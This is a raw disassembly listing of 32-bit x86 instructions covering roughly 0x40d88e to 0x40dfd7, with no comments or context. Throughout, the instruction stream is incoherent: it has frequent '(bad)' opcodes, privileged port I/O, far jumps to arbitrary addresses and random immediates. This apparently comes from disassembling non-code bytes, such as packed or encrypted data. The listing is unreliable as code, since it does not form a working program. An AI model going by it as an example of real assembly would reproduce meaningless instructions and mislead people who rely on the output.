  40d88e:	stos   DWORD PTR es:[edi],eax
  40d88f:	mov    ebp,0xf9125be8
  40d894:	mov    esi,0x92a1bf22
  40d899:	sub    BYTE PTR [eax],dl
  40d89b:	xor    al,0x2
  40d89d:	adc    bh,BYTE PTR [edi+0x56]
  40d8a0:	push   cs
  40d8a1:	lods   al,BYTE PTR ds:[esi]
  40d8a2:	in     al,dx
  40d8a3:	cmp    dh,BYTE PTR ds:0x9c104da9
  40d8a9:	pop    ss
  40d8aa:	sub    eax,DWORD PTR [ecx]
  40d8ac:	xchg   DWORD PTR ds:0xb7eaf24f,ebp
  40d8b2:	fs test al,0xf1
  40d8b5:	test   DWORD PTR [eax+eax*4+0x3629f91],esi
  40d8bc:	(bad)  
  40d8bd:	shl    BYTE PTR [eax+eiz*8],cl
  40d8c0:	fldcw  WORD PTR [eax]
  40d8c2:	mov    ds:0x2ea6131a,eax
  40d8c7:	scas   al,BYTE PTR es:[edi]
  40d8c8:	adc    ebx,DWORD PTR [ebx+ebx*4+0x464fe5bc]
  40d8cf:	inc    eax
  40d8d0:	outs   dx,DWORD PTR ds:[esi]
  40d8d1:	cwde   
  40d8d2:	jg     0x40d86f
  40d8d4:	sti    
  40d8d5:	mov    dh,0x97
  40d8d7:	push   ecx
  40d8d8:	mov    esp,DWORD PTR [ebp-0x5]
  40d8db:	lods   eax,DWORD PTR ds:[esi]
  40d8dc:	and    eax,0xf4fca43d
  40d8e1:	push   cs
  40d8e2:	jecxz  0x40d95e
  40d8e4:	mov    ch,0x8
  40d8e6:	jl     0x40d8c7
  40d8e8:	xchg   BYTE PTR [esi+0x6a],dl
  40d8eb:	jo     0x40d96b
  40d8ed:	test   eax,0x77eaf28f
  40d8f2:	add    DWORD PTR [ebp+0x64],esi
  40d8f5:	pop    eax
  40d8f6:	inc    ecx
  40d8f7:	xchg   edi,ebp
  40d8f9:	in     al,dx
  40d8fa:	(bad)  
  40d8fc:	and    eax,0x797bd828
  40d901:	push   esi
  40d902:	pop    edi
  40d903:	ds cmp ax,0xaec1
  40d908:	xlat   BYTE PTR ds:[ebx]
  40d909:	push   0x6658f3c5
  40d90e:	les    edx,FWORD PTR [ebp-0x2f]
  40d911:	out    0x92,eax
  40d913:	mov    ecx,DWORD PTR [edx-0x4fb27755]
  40d919:	fwait
  40d91a:	sub    DWORD PTR [esi+ebx*2-0x37],0x49d4af35
  40d922:	sti    
  40d923:	pushf  
  40d924:	or     bl,BYTE PTR cs:[eax]
  40d927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d928:	cdq    
  40d929:	mov    cl,0x71
  40d92b:	sbb    BYTE PTR [ebx+0x4867cbb1],cl
  40d931:	mov    ah,0xc7
  40d933:	mov    ch,BYTE PTR [edx]
  40d935:	loopne 0x40d99e
  40d937:	cmp    cl,cl
  40d939:	and    eax,0x6b19bf26
  40d93e:	jbe    0x40d8ec
  40d940:	test   BYTE PTR [eax-0x7d],dh
  40d943:	mov    ebp,0x8e4028d3
  40d948:	fptan  
  40d94a:	das    
  40d94b:	leave  
  40d94c:	scas   eax,DWORD PTR es:[edi]
  40d94d:	aad    0x7c
  40d94f:	add    DWORD PTR [ebp-0x143e3494],eax
  40d955:	or     eax,0xb68d8c29
  40d95a:	dec    ecx
  40d95b:	adc    DWORD PTR [eax-0x64199281],esi
  40d961:	xor    eax,0x9583c45a
  40d966:	aam    0xb0
  40d968:	jb     0x40d928
  40d96a:	dec    edi
  40d96b:	test   al,0x22
  40d96d:	sbb    al,0xd9
  40d96f:	xchg   edx,eax
  40d970:	(bad)  
  40d971:	test   eax,0x1e9c9454
  40d976:	test   BYTE PTR [ecx+0x77],bl
  40d979:	jnp    0x40d9d7
  40d97b:	test   al,0xb6
  40d97d:	mov    ch,0xf0
  40d97f:	fcom   DWORD PTR [ebx]
  40d981:	inc    esp
  40d982:	or     BYTE PTR [esi+0x77],ch
  40d985:	jb     0x40d9cd
  40d987:	dec    esp
  40d988:	cmp    DWORD PTR [ecx],esi
  40d98a:	repz in eax,0x77
  40d98d:	std    
  40d98e:	mov    ?,WORD PTR [esi]
  40d990:	sti    
  40d991:	mov    eax,ebp
  40d993:	loop   0x40d930
  40d995:	inc    eax
  40d996:	mov    BYTE PTR [edi+eax*1],0x15
  40d99a:	arpl   WORD PTR [edx+0x45],cx
  40d99d:	retf   
  40d99e:	data16 jge 0x40d9e3
  40d9a1:	xchg   esp,eax
  40d9a2:	adc    BYTE PTR [edi-0x5a1de952],0x8b
  40d9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9aa:	std    
  40d9ab:	jb     0x40da02
  40d9ad:	xor    ch,BYTE PTR [edx-0x285f9b4a]
  40d9b3:	ins    BYTE PTR es:[edi],dx
  40d9b4:	sbb    DWORD PTR [edi+0x42],0x6d
  40d9b8:	pusha  
  40d9b9:	and    eax,0x34422709
  40d9be:	xchg   ebx,eax
  40d9bf:	inc    esi
  40d9c0:	sub    ecx,DWORD PTR [eax+eax*8-0x1a25ac94]
  40d9c7:	cmp    BYTE PTR [ecx+0x77],0x7d
  40d9cb:	out    0xa0,eax
  40d9cd:	push   ss
  40d9ce:	ret    0x1bf9
  40d9d1:	xor    ebx,DWORD PTR [edx+0xa568b6e]
  40d9d7:	in     al,0x1
  40d9d9:	push   ss
  40d9da:	adc    al,0x2b
  40d9dc:	mov    esp,DWORD PTR [eax+0x26e399c3]
  40d9e2:	jg     0x40d976
  40d9e4:	sub    eax,0xcf5a54a4
  40d9e9:	mov    dh,bh
  40d9eb:	xchg   esi,eax
  40d9ec:	push   DWORD PTR ss:[ebx+0x7a6e20d8]
  40d9f3:	sub    edx,0xffffff96
  40d9f6:	cmc    
  40d9f7:	and    al,0xf6
  40d9f9:	cli    
  40d9fa:	push   eax
  40d9fb:	pusha  
  40d9fc:	add    esp,DWORD PTR [ecx-0x4372e59a]
  40da02:	xchg   esp,edi
  40da04:	div    BYTE PTR [esi+edi*4+0x3c]
  40da08:	cld    
  40da09:	fist   WORD PTR [ebp-0xa]
  40da0c:	adc    DWORD PTR [ebx+0x4e],esp
  40da0f:	sti    
  40da10:	bound  edi,QWORD PTR [ecx-0x1ddf8f21]
  40da16:	push   DWORD PTR [ebp+ebx*4+0x16d2efdf]
  40da1d:	and    DWORD PTR [ebp+0x68],eax
  40da20:	outs   dx,DWORD PTR ds:[esi]
  40da21:	or     BYTE PTR [ecx+0x79],ah
  40da24:	cwde   
  40da25:	cdq    
  40da26:	(bad)  
  40da27:	jecxz  0x40da0b
  40da29:	les    edx,FWORD PTR [esi+0x12]
  40da2c:	push   es
  40da2d:	sbb    esp,DWORD PTR [edi-0x26a293a5]
  40da33:	in     eax,0x80
  40da35:	push   ebx
  40da36:	loopne 0x40daae
  40da38:	(bad)  
  40da39:	cdq    
  40da3a:	push   0xffffffe9
  40da3c:	jmp    0xe14c178c
  40da41:	lods   eax,DWORD PTR ds:[esi]
  40da42:	pop    es
  40da43:	out    dx,al
  40da44:	mov    WORD PTR [edi+edi*4-0x20],ss
  40da48:	push   esi
  40da49:	dec    eax
  40da4a:	jmp    0x3f8:0x33ec8304
  40da51:	xlat   BYTE PTR ds:[ebx]
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0x1b,eax
  40da6e:	cmp    ecx,ecx
  40da70:	pop    edx
  40da71:	xor    ah,BYTE PTR [edx+0x79707e7e]
  40da77:	jle    0x40daf7
  40da79:	xchg   esp,eax
  40da7a:	aas    
  40da7b:	js     0x40daf5
  40da7d:	jae    0x40da14
  40da7f:	test   al,0xf7
  40da81:	iret   
  40da82:	ror    DWORD PTR [ebp+0x12],0xc2
  40da86:	repnz stos DWORD PTR es:[edi],eax
  40da88:	or     BYTE PTR [edx],bl
  40da8a:	lea    esi,[eax]
  40da8c:	cmp    DWORD PTR [eax],0x35721d2
  40da92:	ror    DWORD PTR [ecx-0x7630872f],1
  40da98:	xchg   esi,eax
  40da99:	into   
  40da9a:	fcomp  DWORD PTR gs:[edi-0x62]
  40da9e:	nop
  40da9f:	cmp    dh,ch
  40daa1:	xor    eax,0x2a5a1dfa
  40daa6:	jns    0x40da52
  40daa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa9:	dec    ebx
  40daaa:	jmp    0x40db07
  40daac:	ret    0x9554
  40daaf:	cvtdq2ps xmm0,xmm1
  40dab2:	ror    BYTE PTR [ebp+0x25],0x25
  40dab6:	es push ebp
  40dab8:	mov    ebp,0x191d38ff
  40dabd:	mov    cl,0x4f
  40dabf:	(bad)  
  40dac0:	in     eax,0x81
  40dac2:	adc    cl,BYTE PTR [edx-0x139437d1]
  40dac8:	in     al,0x5
  40daca:	inc    BYTE PTR [ebp+0x79]
  40dacd:	dec    edx
  40dace:	add    esi,ecx
  40dad0:	mov    BYTE PTR [ecx],0x8c
  40dad3:	ins    BYTE PTR es:[edi],dx
  40dad4:	scas   eax,DWORD PTR es:[edi]
  40dad5:	dec    ebp
  40dad6:	inc    edx
  40dad7:	fnstcw WORD PTR [ebp-0x31]
  40dada:	pop    ecx
  40dadb:	mov    esi,0x59848a7f
  40dae0:	push   cs
  40dae1:	sahf   
  40dae2:	push   esi
  40dae3:	mov    eax,0x3f0ca3c4
  40dae8:	shl    BYTE PTR [edi],cl
  40daea:	jb     0x40dace
  40daec:	hlt    
  40daed:	adc    BYTE PTR [ebp+edx*4-0x38],cl
  40daf1:	push   esp
  40daf2:	ss cld 
  40daf4:	enter  0xa618,0xe6
  40daf8:	ficomp WORD PTR [edi-0x78]
  40dafb:	cdq    
  40dafc:	sbb    BYTE PTR [ebp-0x17],dl
  40daff:	pop    edx
  40db00:	and    ebx,esi
  40db02:	aaa    
  40db03:	push   edx
  40db04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db05:	lea    eax,[edx+0x5b]
  40db08:	xchg   edx,eax
  40db09:	rcr    BYTE PTR [ebp+0x4f],0xbb
  40db0d:	icebp  
  40db0e:	shl    BYTE PTR [ecx-0x7b],0x98
  40db12:	ins    DWORD PTR es:[edi],dx
  40db13:	popa   
  40db14:	mov    es,WORD PTR [edi+0x4a239c89]
  40db1a:	push   ebp
  40db1b:	popf   
  40db1c:	out    0x85,al
  40db1e:	jle    0x40daf7
  40db20:	das    
  40db21:	mov    edx,ebp
  40db23:	outs   dx,DWORD PTR ds:[esi]
  40db24:	jne    0x40dabb
  40db26:	push   esp
  40db27:	xor    eax,0x322fa496
  40db2c:	cld    
  40db2d:	popf   
  40db2e:	test   BYTE PTR [ebx+0x11bb6a69],bl
  40db34:	cmp    ch,dh
  40db36:	shl    BYTE PTR [ecx+0x10],1
  40db39:	pop    edx
  40db3a:	cmp    ecx,DWORD PTR [eax]
  40db3c:	jmp    0x1bc3:0x7f4bace5
  40db43:	cwde   
  40db44:	dec    ecx
  40db45:	test   eax,ecx
  40db47:	cwde   
  40db48:	test   al,0x59
  40db4a:	xor    bh,ah
  40db4c:	mov    edi,DWORD PTR [esi]
  40db4e:	mov    dl,0x59
  40db50:	pop    ebp
  40db51:	mov    ecx,0x6ff9cc3e
  40db56:	clc    
  40db57:	outs   dx,BYTE PTR ds:[esi]
  40db58:	and    ah,cl
  40db5a:	icebp  
  40db5b:	xchg   DWORD PTR [eax+eax*1],eax
  40db5e:	js     0x40dba5
  40db60:	jmp    0x5c309f0
  40db65:	lods   eax,DWORD PTR ds:[esi]
  40db66:	jp     0x40daf1
  40db68:	out    dx,eax
  40db69:	(bad)  
  40db6a:	ins    BYTE PTR es:[edi],dx
  40db6b:	daa    
  40db6c:	mov    edx,0x8ec689f9
  40db71:	or     al,0x5
  40db73:	es sub eax,0xf61d99a8
  40db79:	push   esp
  40db7a:	ins    DWORD PTR es:[edi],dx
  40db7b:	inc    edx
  40db7c:	xchg   DWORD PTR [edi+edx*2],ebp
  40db7f:	in     eax,dx
  40db80:	adc    ebp,edx
  40db82:	push   esi
  40db83:	not    BYTE PTR [ecx-0x6dd9dcbe]
  40db89:	test   dh,0x9f
  40db8c:	in     eax,0xd4
  40db8e:	mov    ch,BYTE PTR [ecx]
  40db90:	mov    ebx,0xd08e9a10
  40db95:	xchg   ebp,eax
  40db96:	add    BYTE PTR ds:0xa892e7ae,0xe9
  40db9d:	push   edx
  40db9e:	jbe    0x40dbef
  40dba0:	in     al,dx
  40dba1:	lods   eax,DWORD PTR ds:[esi]
  40dba2:	jns    0x40dc0b
  40dba4:	into   
  40dba5:	mov    WORD PTR [ebp+0x52],gs
  40dba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dba9:	aad    0x88
  40dbab:	icebp  
  40dbac:	cmp    al,0xc9
  40dbae:	jecxz  0x40dbbb
  40dbb0:	pop    ebx
  40dbb1:	out    0xee,eax
  40dbb3:	int3   
  40dbb4:	dec    edi
  40dbb5:	mov    edi,0xa42d6850
  40dbba:	inc    edx
  40dbbb:	stc    
  40dbbc:	xchg   edx,eax
  40dbbd:	add    bl,ah
  40dbbf:	leave  
  40dbc0:	xchg   edx,eax
  40dbc1:	enter  0x2803,0x8c
  40dbc5:	pop    esi
  40dbc6:	push   ecx
  40dbc7:	int    0xdb
  40dbc9:	dec    ebp
  40dbca:	push   es
  40dbcb:	or     eax,0x629f7950
  40dbd0:	out    0xe5,al
  40dbd2:	dec    edi
  40dbd3:	sub    bh,al
  40dbd5:	js     0x40dbd5
  40dbd7:	stos   BYTE PTR es:[edi],al
  40dbd8:	inc    ecx
  40dbd9:	in     al,0xc
  40dbdb:	ret    0x1a6a
  40dbde:	pop    esi
  40dbdf:	inc    ecx
  40dbe0:	ss inc ebp
  40dbe2:	dec    edi
  40dbe3:	sub    eax,0x829bf166
  40dbe8:	fild   QWORD PTR [eax-0x3b]
  40dbeb:	inc    esp
  40dbec:	and    edi,DWORD PTR [edi+0x17bc415]
  40dbf2:	mov    ah,0xf9
  40dbf4:	push   ecx
  40dbf5:	js     0x40dbf0
  40dbf7:	inc    edx
  40dbf8:	dec    DWORD PTR [esi]
  40dbfa:	fsub   st,st(3)
  40dbfc:	mov    ds:0xf0960e2,al
  40dc01:	inc    edi
  40dc02:	ins    BYTE PTR es:[edi],dx
  40dc03:	shl    ecx,cl
  40dc05:	mov    dl,0x8
  40dc07:	retf   
  40dc08:	std    
  40dc09:	dec    esi
  40dc0a:	fadd   DWORD PTR [edi-0x2f]
  40dc0d:	mov    cl,BYTE PTR [edx+eiz*4-0x24969fa7]
  40dc14:	or     dl,ch
  40dc16:	test   al,0xe4
  40dc18:	hlt    
  40dc19:	mov    ds:0xddcc12ec,eax
  40dc1e:	jae    0x40dc5a
  40dc20:	sub    al,0xf0
  40dc22:	mov    ds:0x25bea5ff,al
  40dc27:	cdq    
  40dc28:	and    BYTE PTR [esi-0x43],ah
  40dc2b:	sbb    edi,DWORD PTR [ebx-0x41]
  40dc2e:	mov    eax,0x7bde9d6d
  40dc33:	adc    BYTE PTR [ecx-0x6bea1c4e],dh
  40dc39:	and    eax,0xca5a739b
  40dc3e:	std    
  40dc3f:	mov    ah,0xaa
  40dc41:	mov    edi,0x781756a2
  40dc46:	mov    cl,0x89
  40dc48:	ret    0x406
  40dc4b:	das    
  40dc4c:	push   ss
  40dc4d:	sub    ebp,DWORD PTR [ebx+0x4c4ee5ab]
  40dc53:	adc    DWORD PTR [edi-0x4f],ebx
  40dc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc57:	add    ebx,esp
  40dc59:	xchg   edx,eax
  40dc5a:	inc    ecx
  40dc5b:	fst    QWORD PTR [eax+0x79]
  40dc5e:	int    0x45
  40dc60:	clc    
  40dc61:	and    ebp,DWORD PTR [ecx]
  40dc63:	jl     0x40dc86
  40dc65:	stos   BYTE PTR es:[edi],al
  40dc66:	push   eax
  40dc67:	je     0x40dc2c
  40dc69:	fwait
  40dc6a:	call   FWORD PTR [eax+0x7]
  40dc6d:	outs   dx,BYTE PTR ds:[esi]
  40dc6e:	mov    ebx,0xc642a2fd
  40dc73:	sub    al,0x98
  40dc75:	pop    ebx
  40dc76:	dec    eax
  40dc77:	imul   ecx,DWORD PTR [edx-0x58],0x7a51e369
  40dc7e:	xchg   BYTE PTR [eax-0x15],cl
  40dc81:	and    BYTE PTR [ebx],ah
  40dc83:	push   esp
  40dc84:	sub    bl,0xa0
  40dc87:	fild   QWORD PTR [edi+0x792de937]
  40dc8d:	adc    ch,BYTE PTR [ebp-0x2af9edbe]
  40dc93:	cld    
  40dc94:	cld    
  40dc95:	inc    ebp
  40dc96:	fs mov ah,0xbc
  40dc99:	xchg   esp,eax
  40dc9a:	dec    ebp
  40dc9b:	sbb    ebx,eax
  40dc9d:	test   al,0xd3
  40dc9f:	or     ah,0x7b
  40dca2:	mov    ah,0x25
  40dca4:	(bad)  
  40dca5:	stos   DWORD PTR es:[edi],eax
  40dca6:	inc    ecx
  40dca7:	sub    BYTE PTR [ebx],bl
  40dca9:	pop    edx
  40dcaa:	imul   ebp,DWORD PTR [eax+0x60],0xffffffb9
  40dcae:	js     0x40dd24
  40dcb0:	(bad)  
  40dcb1:	loop   0x40dd1b
  40dcb3:	push   esp
  40dcb4:	pushf  
  40dcb5:	mov    DWORD PTR [ebp+0x53],ebx
  40dcb8:	jge    0x40dc52
  40dcba:	sahf   
  40dcbb:	jmp    0x40dcca
  40dcbd:	ins    BYTE PTR es:[edi],dx
  40dcbe:	mov    esp,0x1e7c60f6
  40dcc3:	nop
  40dcc4:	test   BYTE PTR [ebx+eiz*2-0x2000bfd3],cl
  40dccb:	push   ebp
  40dccc:	sti    
  40dccd:	xchg   BYTE PTR [ecx-0x35926b3a],cl
  40dcd3:	(bad)  
  40dcd4:	test   eax,0x3f3ae150
  40dcd9:	and    DWORD PTR [ecx],esp
  40dcdb:	pop    es
  40dcdc:	xchg   ecx,eax
  40dcdd:	cmp    DWORD PTR [ecx-0x4c],edi
  40dce0:	cld    
  40dce1:	xor    dl,BYTE PTR [ebx-0x470b24e6]
  40dce7:	hlt    
  40dce8:	(bad)  
  40dce9:	repnz xchg edx,eax
  40dceb:	push   eax
  40dcec:	imul   esi,DWORD PTR [esi+0x360f210f],0x887aee9c
  40dcf6:	leave  
  40dcf7:	ret    
  40dcf8:	daa    
  40dcf9:	lds    ecx,FWORD PTR fs:0x1e2aa56f
  40dd00:	fisttp DWORD PTR [edi-0x53bc5216]
  40dd06:	push   esi
  40dd07:	popf   
  40dd08:	mov    cl,0xad
  40dd0a:	loop   0x40dd1d
  40dd0c:	dec    eax
  40dd0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd0e:	repnz outs dx,BYTE PTR ds:[esi]
  40dd10:	mov    bl,0x2f
  40dd12:	(bad)  
  40dd13:	mov    esi,0xd0bfc115
  40dd18:	xchg   ebx,eax
  40dd19:	out    dx,al
  40dd1a:	jbe    0x40dd16
  40dd1c:	clc    
  40dd1d:	dec    esp
  40dd1e:	jo     0x40dce0
  40dd20:	js     0x40dd95
  40dd22:	fldenv [ebx-0x32]
  40dd25:	shl    esi,0x9e
  40dd28:	out    dx,eax
  40dd29:	dec    edx
  40dd2a:	leave  
  40dd2b:	adc    esi,DWORD PTR [ebp-0x64ae8e3f]
  40dd31:	bound  esi,QWORD PTR [edi-0x44f81e5b]
  40dd37:	adc    BYTE PTR [eax+0x377feb8],0xf
  40dd3e:	(bad)  
  40dd40:	cdq    
  40dd41:	repz aaa 
  40dd43:	cmp    ah,al
  40dd45:	or     eax,0x59371b5d
  40dd4a:	mov    edi,0xe144a58c
  40dd4f:	xor    eax,0xc83f6d26
  40dd54:	in     al,0x27
  40dd56:	int3   
  40dd57:	fld    QWORD PTR [ebx+0x73]
  40dd5a:	mov    esp,ds
  40dd5c:	loope  0x40dd21
  40dd5e:	xchg   dl,cl
  40dd60:	xchg   ebp,eax
  40dd61:	fidivr WORD PTR ds:0x5a8cf76b
  40dd67:	mov    eax,0x1c6a90ae
  40dd6c:	mov    ah,0x41
  40dd6e:	push   es
  40dd6f:	jno    0x40dd04
  40dd71:	push   cs
  40dd72:	repnz mov dl,0x51
  40dd75:	test   al,0xfa
  40dd77:	les    esi,FWORD PTR [ebx]
  40dd79:	and    eax,0x2eb7f185
  40dd7e:	sub    bl,0x4c
  40dd81:	xor    al,0x9d
  40dd83:	adc    DWORD PTR [edx+0x5ac00886],edx
  40dd89:	xchg   DWORD PTR [ecx+ebp*4+0x34c01b59],ecx
  40dd90:	gs inc esp
  40dd92:	xor    ebp,eax
  40dd94:	dec    ebp
  40dd95:	lods   eax,DWORD PTR ds:[esi]
  40dd96:	fadd   DWORD PTR [ebx]
  40dd98:	xor    BYTE PTR ds:0x890383e7,cl
  40dd9e:	sbb    bh,ah
  40dda0:	pop    ss
  40dda1:	cmp    al,0x4b
  40dda3:	cmc    
  40dda4:	cmp    BYTE PTR [edi+eiz*1-0x2a92f316],dh
  40ddab:	and    DWORD PTR ds:0x60e90fbf,ebx
  40ddb1:	and    BYTE PTR [ecx],0xe1
  40ddb4:	fnstsw WORD PTR [ebx+0x3826c4c]
  40ddba:	rol    DWORD PTR [edx-0x6],0xc5
  40ddbe:	cmp    DWORD PTR [esi-0x12],ebp
  40ddc1:	int3   
  40ddc2:	and    eax,0xc81d6a10
  40ddc7:	ds sbb al,0xa
  40ddca:	mov    esp,0x4b61d010
  40ddcf:	pop    eax
  40ddd0:	mov    eax,0xa1f261bc
  40ddd5:	mov    al,ds:0x1c6f044d
  40ddda:	(bad)  
  40dddb:	xlat   BYTE PTR ds:[ebx]
  40dddc:	stos   BYTE PTR es:[edi],al
  40dddd:	mov    ecx,0xe4346e89
  40dde2:	stos   DWORD PTR es:[edi],eax
  40dde3:	test   dl,al
  40dde5:	fdivr  st(7),st
  40dde7:	and    eax,0xf6dee1ef
  40ddec:	test   cl,dl
  40ddee:	inc    BYTE PTR [ebp+0x78756ec8]
  40ddf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddf5:	mov    bh,0x12
  40ddf7:	pushf  
  40ddf8:	xor    esp,DWORD PTR [eax+0x1ea710d8]
  40ddfe:	push   eax
  40ddff:	hlt    
  40de00:	test   al,0x2c
  40de02:	lea    eax,[ebx+0x5a26d23b]
  40de08:	xchg   edi,eax
  40de09:	inc    edi
  40de0a:	popa   
  40de0b:	out    dx,eax
  40de0c:	hlt    
  40de0d:	retf   0xcaff
  40de10:	(bad)  
  40de11:	pop    ds
  40de12:	dec    ax
  40de14:	pop    eax
  40de15:	mov    dl,0x1
  40de17:	cld    
  40de18:	push   esp
  40de19:	mov    dh,0x9e
  40de1b:	add    ecx,ecx
  40de1d:	test   eax,0x7221e97c
  40de22:	jl     0x40de43
  40de24:	jno    0x40de5c
  40de26:	stos   DWORD PTR es:[edi],eax
  40de27:	sub    DWORD PTR [ebp-0x7e],ebp
  40de2a:	xor    al,0xb9
  40de2c:	inc    esp
  40de2d:	mov    ds:0x48557d5a,al
  40de32:	add    al,0xbd
  40de34:	leave  
  40de35:	pop    ecx
  40de36:	sub    al,0x2a
  40de38:	and    esp,DWORD PTR [ebp+0x5d]
  40de3b:	out    0x56,al
  40de3d:	fmulp  st(3),st
  40de3f:	xchg   ecx,eax
  40de40:	dec    ebx
  40de41:	stc    
  40de42:	inc    edi
  40de43:	(bad)  
  40de44:	cmc    
  40de45:	loope  0x40de09
  40de47:	mov    cl,0xba
  40de49:	mov    ds:0x8d9e8105,al
  40de4e:	test   DWORD PTR [eax-0x4e],ebp
  40de51:	mov    al,ds:0x15e82d41
  40de56:	dec    esp
  40de57:	jp     0x40de9b
  40de59:	dec    ebp
  40de5a:	mov    ah,0x5c
  40de5c:	inc    eax
  40de5d:	popa   
  40de5e:	cmp    esi,edi
  40de60:	pop    ecx
  40de61:	mov    bh,0xf6
  40de63:	(bad)  
  40de65:	inc    edi
  40de66:	repnz xor DWORD PTR [eax],0x71
  40de6a:	xchg   esi,eax
  40de6b:	jne    0x6f4ab362
  40de71:	ror    ebp,0x89
  40de74:	push   ebp
  40de75:	clc    
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	sub    eax,0x348e6520
  40de96:	scas   al,BYTE PTR es:[edi]
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	or     esp,DWORD PTR [edi-0x21]
  40dea0:	test   BYTE PTR [ebx],dh
  40dea2:	sahf   
  40dea3:	addr16 mov ebp,0x8bb1077f
  40dea9:	xchg   esi,eax
  40deaa:	mov    ebx,0xef32a405
  40deaf:	jmp    0x908d482b
  40deb4:	mov    ebp,0x2c33c0b2
  40deb9:	sbb    bh,BYTE PTR [edi+0x77]
  40debc:	adc    DWORD PTR [edx+eax*2],ebp
  40debf:	test   al,0x7e
  40dec1:	scas   al,BYTE PTR es:[edi]
  40dec2:	and    al,0xeb
  40dec4:	mov    ebx,0xd93b1cad
  40dec9:	mov    WORD PTR [edx],es
  40decb:	out    dx,al
  40decc:	leave  
  40decd:	mov    WORD PTR [eax],es
  40decf:	jg     0x40defd
  40ded1:	add    al,0xa6
  40ded3:	jecxz  0x40deea
  40ded5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded6:	fs xor esi,ebp
  40ded9:	mov    ecx,0xef9daa81
  40dede:	(bad)  
  40dedf:	adc    eax,0xc9812b7b
  40dee4:	dec    edi
  40dee5:	adc    al,dh
  40dee7:	pop    esi
  40dee8:	aad    0x1a
  40deea:	out    dx,eax
  40deeb:	add    eax,0xc3bad651
  40def0:	stos   BYTE PTR es:[edi],al
  40def1:	mov    ecx,DWORD PTR [ecx]
  40def3:	lods   eax,DWORD PTR ds:[esi]
  40def4:	adc    eax,0xcd3dfd6f
  40def9:	push   edx
  40defa:	cld    
  40defb:	or     ebx,DWORD PTR [edx+0x7c5e7a57]
  40df01:	rcl    DWORD PTR [eax+eiz*8-0x5],cl
  40df05:	inc    eax
  40df06:	lock rcr DWORD PTR [edi-0x1a2623d8],cl
  40df0d:	sub    edi,DWORD PTR [ebx-0x6b]
  40df10:	sub    al,dl
  40df12:	or     al,0x66
  40df14:	and    eax,0x1824eab
  40df19:	pop    esi
  40df1a:	jno    0x40df17
  40df1c:	in     eax,dx
  40df1d:	push   esp
  40df1e:	sub    eax,0xe6c38701
  40df23:	and    ecx,DWORD PTR [edi]
  40df25:	mov    dh,0xae
  40df27:	(bad)  
  40df29:	(bad)  
  40df2a:	(bad)  
  40df2b:	fdivr  QWORD PTR [edi-0x2e]
  40df2e:	dec    eax
  40df2f:	retf   
  40df30:	sti    
  40df31:	cmc    
  40df32:	mov    esi,0xb9e6eda1
  40df37:	mov    ebp,0x1a96a039
  40df3c:	jge    0x40dfb4
  40df3e:	sar    al,cl
  40df40:	outs   dx,BYTE PTR ds:[esi]
  40df41:	xor    ebp,edx
  40df43:	out    dx,eax
  40df44:	fimul  DWORD PTR [eax]
  40df46:	sti    
  40df47:	pusha  
  40df48:	(bad)  
  40df49:	jmp    0x40dfc0
  40df4b:	pop    ebx
  40df4c:	stos   BYTE PTR es:[edi],al
  40df4d:	call   0x55ea:0x6b2454c1
  40df54:	mov    ah,0x76
  40df56:	mov    ds,WORD PTR [edx+ecx*2+0xe]
  40df5a:	cwde   
  40df5b:	(bad)  
  40df5c:	lods   eax,DWORD PTR ds:[esi]
  40df5d:	sbb    ecx,DWORD PTR [esi+0x31]
  40df60:	pop    edx
  40df61:	lea    ebp,[ebx+0x61dacab8]
  40df67:	dec    esi
  40df68:	aas    
  40df69:	adc    DWORD PTR [ecx-0x50],eax
  40df6c:	es or  al,0x95
  40df6f:	stc    
  40df70:	or     DWORD PTR [eax-0x2d05ec86],ebp
  40df76:	sub    al,0x3c
  40df78:	or     BYTE PTR ds:0x49acae87,ch
  40df7e:	out    dx,al
  40df7f:	aas    
  40df80:	lock and ah,bl
  40df83:	retf   
  40df84:	sub    eax,0xa6f7d4e1
  40df89:	rcl    DWORD PTR [esp+edx*1+0x66679636],0x14
  40df91:	pop    esi
  40df92:	xor    DWORD PTR [eax],eax
  40df94:	dec    esp
  40df95:	not    BYTE PTR [esp+ebp*1+0xd]
  40df99:	cmp    edx,ecx
  40df9b:	stos   BYTE PTR es:[edi],al
  40df9c:	push   edi
  40df9d:	mul    DWORD PTR [ebx]
  40df9f:	jmp    0xad268184
  40dfa4:	jmp    0xb963b9bf
  40dfa9:	call   0xea394feb
  40dfae:	inc    esi
  40dfaf:	push   ebx
  40dfb0:	ja     0x40dfd7
  40dfb2:	push   edi
  40dfb3:	call   0x10e7:0xcb4b2029
  40dfba:	sti    
  40dfbb:	cwde   
  40dfbc:	jmp    0x40e008
  40dfbe:	aas    
  40dfbf:	xchg   esp,eax
  40dfc0:	fcom   DWORD PTR [ebx+0x3fd7d7e7]
  40dfc6:	(bad)  
  40dfc7:	cmp    BYTE PTR [esp+ecx*2+0x6f],al
  40dfcb:	ja     0x40e001
  40dfcd:	push   es
  40dfce:	test   DWORD PTR [esi-0x6f],esi
  40dfd1:	sbb    bl,ah
  40dfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfd4:	fisttp QWORD PTR [eax]
  40dfd6:	inc    esi
  40dfd7:	(bad)  
